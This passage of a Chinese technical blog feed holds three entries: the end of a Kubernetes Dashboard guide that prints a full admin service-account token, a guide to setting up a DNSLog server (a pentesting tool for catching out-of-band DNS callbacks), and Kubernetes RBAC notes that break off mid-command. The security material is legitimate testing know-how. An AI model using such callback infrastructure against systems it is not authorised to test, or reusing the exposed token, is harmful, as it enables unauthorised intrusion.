dashboard-admin</span><br><span class="line">dashboard-admin-token-xbqhh        kubernetes.io/service-account-token   3      2m35s</span><br><span class="line"></span><br><span class="line">[root@k8s-master01 ~]# kubectl describe secrets dashboard-admin-token-xbqhh -n kubernetes-dashboard</span><br><span class="line">Name:         dashboard-admin-token-xbqhh</span><br><span class="line">Namespace:    kubernetes-dashboard</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  kubernetes.io/service-account.name: dashboard-admin</span><br><span class="line">              kubernetes.io/service-account.uid: 95d84d80-be7a-4d10-a2e0-68f90222d039</span><br><span class="line"></span><br><span class="line">Type:  kubernetes.io/service-account-token</span><br><span class="line"></span><br><span class="line">Data</span><br><span class="line">====</span><br><span class="line">namespace:  20 bytes</span><br><span class="line">token:      eyJhbGciOiJSUzI1NiIsImtpZCI6ImJrYkF4bW5XcDhWcmNGUGJtek5NODFuSXl1aWptMmU2M3o4LTY5a2FKS2cifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkYXNoYm9hcmQtYWRtaW4tdG9rZW4teGJxaGgiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGFzaGJvYXJkLWFkbWluIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiOTVkODRkODAtYmU3YS00ZDEwLWEyZTAtNjhmOTAyMjJkMDM5Iiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmVybmV0ZXMtZGFzaGJvYXJkOmRhc2hib2FyZC1hZG1pbiJ9.NAl7e8ZfWWdDoPxkqzJzTB46sK9E8iuJYnUI9vnBaY3Jts7T1g1msjsBnbxzQSYgAG--cV0WYxjndzJY_UWCwaGPrQrt_GunxmOK9AUnzURqm55GR2RXIZtjsWVP2EBatsDgHRmuUbQvTFOvdJB4x3nXcYLN2opAaMqg3rnU2rr-A8zCrIuX_eca12wIp_QiuP3SF-tzpdLpsyRfegTJZl6YnSGyaVkC9id-cxZRb307qdCfXPfCHR_2rt5FVfxARgg_C0e3eFHaaYQO7CitxsnIoIXpOFNAR8aUrmopJyODQIPqBWUehb7FhlU1DCduHnIIXVC_UICZ-MKYewBDLw</span><br><span class="line">ca.crt:     1025 bytes</span><br></pre></td></tr></table></figure><p>3）通过浏览器访问Dashboard的UI</p><p>在登录页面上输入上面的token</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200520144548997.png" alt="image-20200520144548997"></p><p>出现下面的页面代表成功</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200520144959353.png" alt="image-20200520144959353"></p><h2 id="10-2-使用DashBoard"><a href="#10-2-使用DashBoard" class="headerlink" title="10.2 使用DashBoard"></a>10.2 使用DashBoard</h2><p>本章节以Deployment为例演示DashBoard的使用</p><p><strong>查看</strong></p><p>选择指定的命名空间<code>dev</code>，然后点击<code>Deployments</code>，查看dev空间下的所有deployment</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200520154628679.png" alt="img"></p><p><strong>扩缩容</strong></p><p>在<code>Deployment</code>上点击<code>规模</code>，然后指定<code>目标副本数量</code>，点击确定</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200520162605102.png" alt="img"></p><p><strong>编辑</strong></p><p>在<code>Deployment</code>上点击<code>编辑</code>，然后修改<code>yaml文件</code>，点击确定</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200520163253644.png" alt="image-20200520163253644"></p><p><strong>查看Pod</strong></p><p>点击<code>Pods</code>, 查看pods列表</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200520163552110.png" alt="img"></p><p><strong>操作Pod</strong></p><p>选中某个Pod，可以对其执行日志（logs）、进入执行（exec）、编辑、删除操作</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200520163832827.png" alt="img"></p><blockquote><p>Dashboard提供了kubectl的绝大部分功能，这里不再一一演示</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Doc </category>
          
          <category> Kubernetes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kubernetes </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNSLog平台搭建</title>
      <link href="/2022/07/18/c104c077d9c5-q1jun/"/>
      <url>/2022/07/18/c104c077d9c5-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>搭建一个DNSLog平台需要准备以下：</p><ul><li>购买一个合法域名</li><li>具有公网IP的服务器</li></ul><blockquote><p>我使用的是阿里云ECS服务器(Linux)、阿里云域名解析服务，其他平台类似。</p></blockquote><hr><p>我们都知道DNS就是将域名解析为ip，用户在浏览器上输入一个域名A.com，</p><p>就要靠DNS服务器将A.com解析到它的真实ip127.0.0.1，</p><p>这样就可以访问127.0.0.1服务器上的相应服务。</p><p>DNSlog就是存储在DNS服务器上的域名信息，</p><p>它记录着用户对域名 <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a> 等的访问信息，类似日志文件。</p><h2 id="0x02-域名解析配置"><a href="#0x02-域名解析配置" class="headerlink" title="0x02 域名解析配置"></a>0x02 域名解析配置</h2><ol><li>首先在域名解析中添加一条<code>A记录</code>，记录值为服务器公网IP：</li></ol><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220718185553960.png" alt="image-20220718185553960"></p><ol start="2"><li>创建<code>NS记录</code>，记录值为上一步创建的A记录：</li></ol><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220718185748098.png" alt="image-20220718185748098"></p><ol start="3"><li>在域名控制台设置<code>自定义DNS Host</code>，创建DNS服务器：</li></ol><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220718185954758.png" alt="image-20220718185954758"></p><h2 id="0x03-云服务器配置"><a href="#0x03-云服务器配置" class="headerlink" title="0x03 云服务器配置"></a>0x03 云服务器配置</h2><ol><li>下载DNSLog平台到服务器</li></ol><blockquote><p>GitHub地址: <a target="_blank" rel="noopener" href="https://github.com/lanyi1998/DNSlog-GO.git">https://github.com/lanyi1998/DNSlog-GO.git</a></p></blockquote><p>在服务器中输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/lanyi1998/DNSlog-GO/releases/download/1.5.2/DNSlog-GO-linux.zip</span><br></pre></td></tr></table></figure><ol start="2"><li>解压</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip DNSlog-GO-linux.zip</span><br></pre></td></tr></table></figure><ol start="3"><li>进入目录后使用<code>screen</code>保证DNSLog平台可以在后台运行</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">没有安装screen可以通过包管理器安装,已安装则跳过</span></span><br><span class="line">yum install screen #Centos</span><br><span class="line">apt-get install screen #Ubuntu</span><br></pre></td></tr></table></figure><ol start="4"><li>创建新的<code>screen</code>，使用该命令后会自动进入该screen：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -S dnslog</span><br></pre></td></tr></table></figure><ol start="5"><li>修改配置文件<code>config.yaml</code>：</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">HTTP:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8000</span></span><br><span class="line">  <span class="comment">#&#123;&quot;token&quot;:&quot;用户对应子域名&quot;&#125;</span></span><br><span class="line">  <span class="attr">user:</span> &#123; <span class="attr">&quot;password&quot;:</span> <span class="string">&quot;dnslog&quot;</span> &#125;</span><br><span class="line">  <span class="attr">consoleDisable:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">Dns:</span></span><br><span class="line">  <span class="attr">domain:</span> <span class="string">q1jun.cn</span></span><br></pre></td></tr></table></figure><ol start="6"><li>启动DNSLog平台：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x ./main</span><br><span class="line">./main</span><br></pre></td></tr></table></figure><ol start="7"><li>在ECS服务器控制台-&gt;安全组，开放53(UDP)和8000(TCP)端口。</li><li>浏览器输入IP:8000进入DNSLog平台，根据提示输入设置的token<code>password</code>即可进入。</li></ol><h2 id="0x04-Nginx配置-可选"><a href="#0x04-Nginx配置-可选" class="headerlink" title="0x04 Nginx配置(可选)"></a>0x04 Nginx配置(可选)</h2><p>由于本人不喜欢通过<code>IP+端口</code>或者<code>域名+端口</code>的方式访问页面，我一般通过Nginx的方向代理转发端口，这样做的好处是不需要在在<code>ECS服务器控制台-&gt;安全组</code>开放<code>8000</code>端口，在访问的时候不需要记住端口号，也不怕被人扫端口。</p><hr><ol><li>Nginx配置：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  dns.q1jun.cn; #新建的A记录</span><br><span class="line">    access_log  /var/log/nginx/dnslog.access.log  main;</span><br><span class="line">    root /usr/share/nginx/html;</span><br><span class="line">    location / &#123;</span><br><span class="line">    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    proxy_set_header Host $http_host;</span><br><span class="line">    proxy_redirect off;</span><br><span class="line">    proxy_pass http://127.0.0.1:8000; #转发端口</span><br><span class="line"></span><br><span class="line">    # 如果您要使用本地存储策略，请将下一行注释符删除，并更改大小为理论最大文件尺寸</span><br><span class="line">    client_max_body_size 20000m;</span><br><span class="line">    &#125;</span><br><span class="line">    error_page  404              /404.html;</span><br><span class="line"></span><br><span class="line">    # redirect server error pages to the static page /50x.html</span><br><span class="line">    #</span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><p>在域名云解析DNS中添加一条<code>A记录</code>:<code>dns.q1jun.cn</code>作为访问DNSLog平台的域名。</p></li><li><p>重启nginx</p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure><p>搭建成功：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220718192506966.png" alt="image-20220718192506966"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> DNSLog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubernetes笔记 9</title>
      <link href="/2022/07/16/98671b94e31d-q1jun/"/>
      <url>/2022/07/16/98671b94e31d-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="9-安全认证"><a href="#9-安全认证" class="headerlink" title="9. 安全认证"></a>9. 安全认证</h1><h2 id="9-1-访问控制概述"><a href="#9-1-访问控制概述" class="headerlink" title="9.1 访问控制概述"></a>9.1 访问控制概述</h2><p>Kubernetes作为一个分布式集群的管理工具，保证集群的安全性是其一个重要的任务。所谓的安全性其实就是保证对Kubernetes的各种<strong>客户端</strong>进行<strong>认证和鉴权</strong>操作。</p><p><strong>客户端</strong></p><p>在Kubernetes集群中，客户端通常有两类：</p><ul><li><strong>User Account</strong>：一般是独立于kubernetes之外的其他服务管理的用户账号。</li><li><strong>Service Account</strong>：kubernetes管理的账号，用于为Pod中的服务进程在访问Kubernetes时提供身份标识。</li></ul><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200520102949189.png" alt="img"></p><p><strong>认证、授权与准入控制</strong></p><p>ApiServer是访问及管理资源对象的唯一入口。任何一个请求访问ApiServer，都要经过下面三个流程：</p><ul><li>Authentication（认证）：身份鉴别，只有正确的账号才能够通过认证</li><li>Authorization（授权）： 判断用户是否有权限对访问的资源执行特定的动作</li><li>Admission Control（准入控制）：用于补充授权机制以实现更加精细的访问控制功能。</li></ul><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200520103942580.png" alt="img"></p><h2 id="9-2-认证管理"><a href="#9-2-认证管理" class="headerlink" title="9.2 认证管理"></a>9.2 认证管理</h2><p>Kubernetes集群安全的最关键点在于如何识别并认证客户端身份，它提供了3种客户端身份认证方式：</p><ul><li><p>HTTP Base认证：通过用户名+密码的方式认证</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这种认证方式是把“用户名:密码”用BASE64算法进行编码后的字符串放在HTTP请求中的<span class="keyword">Header</span> <span class="keyword">Authorization</span>域里发送给服务端。服务端收到后进行解码，获取用户名及密码，然后进行用户身份认证的过程。</span><br></pre></td></tr></table></figure></li><li><p>HTTP Token认证：通过一个Token来识别合法用户</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这种认证方式是用一个很长的难以被模仿的字符串--<span class="built_in">Token</span>来表明客户身份的一种方式。每个<span class="built_in">Token</span>对应一个用户名，当客户端发起API调用请求时，需要在HTTP <span class="built_in">Header</span>里放入<span class="built_in">Token</span>，API Server接到<span class="built_in">Token</span>后会跟服务器中保存的<span class="built_in">token</span>进行比对，然后进行用户身份认证的过程。</span><br></pre></td></tr></table></figure></li><li><p>HTTPS证书认证：基于CA根证书签名的双向数字证书认证方式</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这种认证方式是安全性最高的一种方式，但是同时也是操作起来最麻烦的一种方式。</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200518211037434.png" alt="img"></p><p><strong>HTTPS认证大体分为3个过程：</strong></p><ol><li><p>证书申请和下发</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTPS通信双方的服务器向<span class="keyword">CA</span>机构申请证书，<span class="keyword">CA</span>机构下发根证书、服务端证书及私钥给申请者</span><br></pre></td></tr></table></figure></li><li><p>客户端和服务端的双向认证</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">1&gt; </span>客户端向服务器端发起请求，服务端下发自己的证书给客户端，</span><br><span class="line">   客户端接收到证书后，通过私钥解密证书，在证书中获得服务端的公钥，</span><br><span class="line">   客户端利用服务器端的公钥认证证书中的信息，如果一致，则认可这个服务器</span><br><span class="line"><span class="meta prompt_">2&gt; </span>客户端发送自己的证书给服务器端，服务端接收到证书后，通过私钥解密证书，</span><br><span class="line">   在证书中获得客户端的公钥，并用该公钥认证证书信息，确认客户端是否合法</span><br></pre></td></tr></table></figure></li><li><p>服务器端和客户端进行通信</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务器端和客户端协商好加密方案后，客户端会产生一个随机的秘钥并加密，然后发送到服务器端。</span><br><span class="line">服务器端接收这个秘钥后，双方接下来通信的所有内容都通过该随机秘钥加密</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>注意: Kubernetes允许同时配置多种认证方式，只要其中任意一个方式认证通过即可</p></blockquote><h2 id="9-3-授权管理"><a href="#9-3-授权管理" class="headerlink" title="9.3 授权管理"></a>9.3 授权管理</h2><p>授权发生在认证成功之后，通过认证就可以知道请求用户是谁， 然后Kubernetes会根据事先定义的授权策略来决定用户是否有权限访问，这个过程就称为授权。</p><p>每个发送到ApiServer的请求都带上了用户和资源的信息：比如发送请求的用户、请求的路径、请求的动作等，授权就是根据这些信息和授权策略进行比较，如果符合策略，则认为授权通过，否则会返回错误。</p><p>API Server目前支持以下几种授权策略：</p><ul><li>AlwaysDeny：表示拒绝所有请求，一般用于测试</li><li>AlwaysAllow：允许接收所有请求，相当于集群不需要授权流程（Kubernetes默认的策略）</li><li>ABAC：基于属性的访问控制，表示使用用户配置的授权规则对用户请求进行匹配和控制</li><li>Webhook：通过调用外部REST服务对用户进行授权</li><li>Node：是一种专用模式，用于对kubelet发出的请求进行访问控制</li><li>RBAC：基于角色的访问控制（kubeadm安装方式下的默认选项）</li></ul><p>RBAC(Role-Based Access Control) 基于角色的访问控制，主要是在描述一件事情：<strong>给哪些对象授予了哪些权限</strong></p><p>其中涉及到了下面几个概念：</p><ul><li>对象：User、Groups、ServiceAccount</li><li>角色：代表着一组定义在资源上的可操作动作(权限)的集合</li><li>绑定：将定义好的角色跟用户绑定在一起</li></ul><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200519181209566.png" alt="img"></p><p>RBAC引入了4个顶级资源对象：</p><ul><li>Role、ClusterRole：角色，用于指定一组权限</li><li>RoleBinding、ClusterRoleBinding：角色绑定，用于将角色（权限）赋予给对象</li></ul><p><strong>Role、ClusterRole</strong></p><p>一个角色就是一组权限的集合，这里的权限都是许可形式的（白名单）。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Role只能对命名空间内的资源进行授权，需要指定nameapce</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">authorization-role</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]  <span class="comment"># 支持的API组列表,&quot;&quot; 空字符串，表示核心API群</span></span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;pods&quot;</span>] <span class="comment"># 支持的资源对象列表</span></span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;list&quot;</span>] <span class="comment"># 允许的对资源对象的操作方法列表</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ClusterRole可以对集群范围内资源、跨namespaces的范围资源、非资源类型进行授权</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"> <span class="attr">name:</span> <span class="string">authorization-clusterrole</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;pods&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;list&quot;</span>]</span><br></pre></td></tr></table></figure><p>需要详细说明的是，rules中的参数：</p><ul><li><p>apiGroups: 支持的API组列表</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>,<span class="string">&quot;apps&quot;</span>, <span class="string">&quot;autoscaling&quot;</span>, <span class="string">&quot;batch&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>resources：支持的资源对象列表</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;services&quot;</span>, <span class="string">&quot;endpoints&quot;</span>, <span class="string">&quot;pods&quot;</span>,<span class="string">&quot;secrets&quot;</span>,<span class="string">&quot;configmaps&quot;</span>,<span class="string">&quot;crontabs&quot;</span>,<span class="string">&quot;deployments&quot;</span>,<span class="string">&quot;jobs&quot;</span>,</span><br><span class="line"><span class="string">&quot;nodes&quot;</span>,<span class="string">&quot;rolebindings&quot;</span>,<span class="string">&quot;clusterroles&quot;</span>,<span class="string">&quot;daemonsets&quot;</span>,<span class="string">&quot;replicasets&quot;</span>,<span class="string">&quot;statefulsets&quot;</span>,</span><br><span class="line"><span class="string">&quot;horizontalpodautoscalers&quot;</span>,<span class="string">&quot;replicationcontrollers&quot;</span>,<span class="string">&quot;cronjobs&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>verbs：对资源对象的操作方法列表</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;create&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;patch&quot;</span>, <span class="string">&quot;delete&quot;</span>, <span class="string">&quot;exec&quot;</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>RoleBinding、ClusterRoleBinding</strong></p><p>角色绑定用来把一个角色绑定到一个目标对象上，绑定目标可以是User、Group或者ServiceAccount。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># RoleBinding可以将同一namespace中的subject绑定到某个Role下，则此subject即具有该Role定义的权限</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">RoleBinding</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">authorization-role-binding</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">User</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">heima</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">authorization-role</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ClusterRoleBinding在整个集群级别和所有namespaces将特定的subject与ClusterRole绑定，授予权限</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"> <span class="attr">name:</span> <span class="string">authorization-clusterrole-binding</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">User</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">heima</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">authorization-clusterrole</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure><p><strong>RoleBinding引用ClusterRole进行授权</strong></p><p>RoleBinding可以引用ClusterRole，对属于同一命名空间内ClusterRole定义的资源主体进行授权。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一种很常用的做法就是，集群管理员为集群范围预定义好一组角色（ClusterRole），然后在多个命名空间中重复使用这些ClusterRole。这样可以大幅提高授权管理工作效率，也使得各个命名空间下的基础性授权规则与使用体验保持一致。</span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 虽然authorization-clusterrole是一个集群角色，但是因为使用了RoleBinding</span></span><br><span class="line"><span class="comment"># 所以heima只能读取dev命名空间中的资源</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">RoleBinding</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">authorization-role-binding-ns</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">User</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">heima</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">authorization-clusterrole</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure><p><strong>实战：创建一个只能管理dev空间下Pods资源的账号</strong></p><ol><li>创建账号</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1) 创建证书</span></span><br><span class="line">[root@k8s-master01 pki]# cd /etc/kubernetes/pki/</span><br><span class="line">[root@k8s-master01 pki]# (umask 077;openssl genrsa -out devman.key 2048)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2) 用apiserver的证书去签署</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2-1) 